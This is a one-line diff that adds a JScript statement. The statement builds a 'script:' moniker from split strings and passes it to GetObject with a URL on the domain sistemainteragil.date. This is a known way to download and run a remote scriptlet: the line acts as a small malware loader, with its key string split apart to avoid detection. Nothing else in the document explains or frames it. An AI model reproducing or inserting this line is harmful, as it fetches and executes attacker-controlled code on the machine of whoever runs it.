@@ -1,0 +1,1 @@
+var a = 'script:';GetObject(a+'HTtp://djwt8upuu4d.sistemainteragil.date/?1/')
